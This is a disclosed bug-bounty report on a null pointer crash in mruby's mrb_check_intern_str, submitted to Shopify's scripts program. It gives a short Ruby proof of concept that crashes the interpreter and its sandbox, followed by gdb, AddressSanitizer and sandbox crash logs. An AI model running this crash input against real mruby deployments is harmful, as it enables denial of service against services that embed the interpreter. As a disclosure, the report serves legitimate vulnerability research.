# SIGSEGV - mrb_check_intern_str() - NullPointer

## Report Details
- **Report ID**: 193075
- **URL**: https://hackerone.com/reports/193075
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-21T14:23:30.522Z
- **Disclosed**: 2017-03-01T21:34:23.821Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
---------------------

The following code triggers the bug (attached as mrb_vm_exec.rb):

	def to_str
	$s.replace("")end
	$s=""
	class Test00espondTo end
	Test00espondTo.respond_to?(0)

Crash - mirb
---------------------

	x@x:~/Desktop/research/mruby/bin$ ./mirb mrb_check_intern_str.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => :to_str
	 => ""
	 => nil
	Segmentation fault (core dumped)


Debug - mirb
---------------------

	x@x:~/Desktop/research/mruby/bin$ gdb -q ./mirb
	Reading symbols from ./mirb...done.
	(gdb) r mrb_check_intern_str.rb 
	Starting program: /home/x/Desktop/research/mruby/bin/mirb mrb_check_intern_str.rb
	mirb - Embeddable Interactive Ruby Shell

	 => :to_str
	 => ""
	 => nil

	Program received signal SIGSEGV, Segmentation fault.
	mrb_check_intern_str (mrb=0x756010, str=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/symbol.c:143
	143	  return mrb_check_intern(mrb, RSTRING_PTR(str), RSTRING_LEN(str));
	(gdb) info reg
	rax            0x3015	12309
	rbx            0x756010	7692304
	rcx            0x745350	7623504
	rdx            0x3	3
	rsi            0x0	0
	rdi            0x756010	7692304
	rbp            0xfffffffffffffffc	0xfffffffffffffffc
	rsp            0x7fffffffc5c0	0x7fffffffc5c0
	r8             0x1	1
	r9             0x0	0
	r10            0x0	0
	r11            0x8000044000000000	-9223367363930357760
	r12            0xfffffffffffffffc	-4
	r13            0x0	0
	r14            0x756010	7692304
	r15            0x759090	7704720
	rip            0x42a540	0x42a540 <mrb_check_intern_str+48>
	eflags         0x10202	[ IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0

Backtrace - mirb
---------------------

	(gdb) bt
	#0  mrb_check_intern_str (mrb=0x756010, str=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/symbol.c:143
	#1  0x0000000000427fc9 in obj_respond_to (mrb=0x756010, self=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/kernel.c:961
	#2  0x000000000040a37d in mrb_vm_exec (mrb=<optimized out>, proc=0x0, pc=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:1171
	#3  0x0000000000402e68 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Clang - mirb
---------------------

	x@x:~/Desktop/research/clang/mruby/bin$ ./mirb mrb_check_intern_str.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => :to_str
	 => ""
	 => nil
	ASAN:DEADLYSIGNAL
	=================================================================
	==5111==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x000000577626 bp 0x7fff9e888950 sp 0x7fff9e888780 T0)
	    #0 0x577625  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x577625)
	    #1 0x56cfff  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x56cfff)
	    #2 0x50b14c  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x50b14c)
	    #3 0x501d5b  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x501d5b)
	    #4 0x4f3ef8  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x4f3ef8)
	    #5 0x7f409fd19ec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)
	    #6 0x41a595  (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a595)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV (/home/x/Desktop/research/clang/mruby/bin/mirb+0x577625) 
	==5111==ABORTING

Crash - mruby
---------------------

	x@x:~/Desktop/research/mruby/bin$ ./mruby mrb_check_intern_str.rb 
	Segmentation fault (core dumped)

Debug - mruby
---------------------

	x@x:~/Desktop/research/mruby/bin$ gdb -q ./mruby
	Reading symbols from ./mruby...done.
	(gdb) r mrb_check_intern_str.rb 
	Starting program: /home/x/Desktop/research/mruby/bin/mruby mrb_check_intern_str.rb

	Program received signal SIGSEGV, Segmentation fault.
	mrb_check_intern_str (mrb=0x755010, str=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/symbol.c:143
	143	  return mrb_check_intern(mrb, RSTRING_PTR(str), RSTRING_LEN(str));
	(gdb) info reg
	rax            0x3015	12309
	rbx            0x755010	7688208
	rcx            0x744330	7619376
	rdx            0x3	3
	rsi            0x0	0
	rdi            0x755010	7688208
	rbp            0xfffffffffffffffc	0xfffffffffffffffc
	rsp            0x7fffffffd740	0x7fffffffd740
	r8             0x1	1
	r9             0x0	0
	r10            0x0	0
	r11            0x8000044000000000	-9223367363930357760
	r12            0xfffffffffffffffc	-4
	r13            0x0	0
	r14            0x755010	7688208
	r15            0x758120	7700768
	rip            0x412e20	0x412e20 <mrb_check_intern_str+48>
	eflags         0x10202	[ IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0

Backtrace - mruby
---------------------

	(gdb) bt
	#0  mrb_check_intern_str (mrb=0x755010, str=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/symbol.c:143
	#1  0x00000000004c95d9 in obj_respond_to (mrb=0x755010, self=<error reading variable: access outside bounds of object referenced via synthetic pointer>) at /home/x/Desktop/research/mruby/src/kernel.c:961
	#2  0x00000000004b842d in mrb_vm_exec (mrb=<optimized out>, proc=0x0, pc=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:1171
	#3  0x00000000004c1ecd in mrb_vm_run (proc=0x7581b0, self=..., stack_keep=1, mrb=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:772
	#4  mrb_top_run (mrb=0x755010, proc=0x7581b0, self=..., stack_keep=<optimized out>) at /home/x/Desktop/research/mruby/src/vm.c:2487
	#5  0x000000000049472f in mrb_load_exec (mrb=0x755010, p=<optimized out>, c=0x7aff30) at /home/x/Desktop/research/mruby/mrbgems/mruby-compiler/core/parse.y:5755
	#6  0x0000000000402c67 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232

Clang - mruby
---------------------

	x@x:~/Desktop/research/clang/mruby/bin$ ./mruby mrb_check_intern_str.rb 
	ASAN:DEADLYSIGNAL
	=================================================================
	==5116==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000051c826 bp 0x7fffd99d7790 sp 0x7fffd99d75c0 T0)
	    #0 0x51c825  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c825)
	    #1 0x69997f  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x69997f)
	    #2 0x65470c  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x65470c)
	    #3 0x64b31b  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x64b31b)
	    #4 0x6773e8  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6773e8)
	    #5 0x616529  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x616529)
	    #6 0x6171c5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x6171c5)
	    #7 0x4f3af5  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x4f3af5)
	    #8 0x7fa8d20caec4  (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)
	    #9 0x41a505  (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a505)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV (/home/x/Desktop/research/clang/mruby/bin/mruby+0x51c825) 
	==5116==ABORTING

Sandbox - Crash
---------------------
Attached as sandbox.log

		x@x:~/Desktop/research/mruby/bin$ ../../mruby-engine/bin/sandbox mrb_check_intern_str.rb 
	../../mruby-engine/bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000001
	ruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]

	-- Control frame information -----------------------------------------------
	c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
	c:0002 p:0186 s:0005 E:001058 EVAL   ../../mruby-engine/bin/sandbox:20 [FINISH]
	c:0001 p:0000 s:0002 E:001f30 TOP    [FINISH]

	-- Ruby level backtrace information ----------------------------------------
	../../mruby-engine/bin/sandbox:20:in `<main>'
	../../mruby-engine/bin/sandbox:20:in `sandbox_eval'

	-- Machine register context ------------------------------------------------
	 RIP: 0x00007f7ff452d994 RBP: 0x00007f7ff30ac040 RSP: 0x00007f7ff30a2980
	 RAX: 0x00007f7ff30ac070 RBX: 0x00007f7ff30a44e0 RCX: 0x0000000000000005
	 RDX: 0x0000000000000010 RDI: 0x00007f7ff30a44e0 RSI: 0x0000000000000001
	  R8: 0x00007f7ff30a43e0  R9: 0x0000000000000001 R10: 0x00007f7ff30a44e0
	 R11: 0x0000000000000000 R12: 0x00007f7ff30af2b0 R13: 0x00007f7ff30b0a00
	 R14: 0x0000000000000001 R15: 0x00007f7ff30a44e0 EFL: 0x0000000000010202

	-- C level backtrace information -------------------------------------------
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8c1fd55]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8c1ff8c]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8afc06b]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f7ff8bb214e]
	...
	...
	...
	7f7ff912c000-7f7ff912d000 r--p 00022000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so
	7f7ff912d000-7f7ff912e000 rw-p 00023000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so
	7f7ff912e000-7f7ff912f000 rw-p 00000000 00:00 0 
	7ffffc1c6000-7ffffc9c5000 rw-p 00000000 00:00 0                          [stack]
	7ffffc9fe000-7ffffca00000 r-xp 00000000 00:00 0                          [vdso]
	ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


	[NOTE]
	You may have encountered a bug in the Ruby interpreter or extension libraries.
	Bug reports are welcome.
	For details: http://www.ruby-lang.org/bugreport.html

	Aborted (core dumped)

Impact
---------------------

This vulnerability is caused by NullPointer error. It can not be exploited, but it can cause DoS.

## Attachments
- mrb_check_intern_str.rb
- sandbox.log
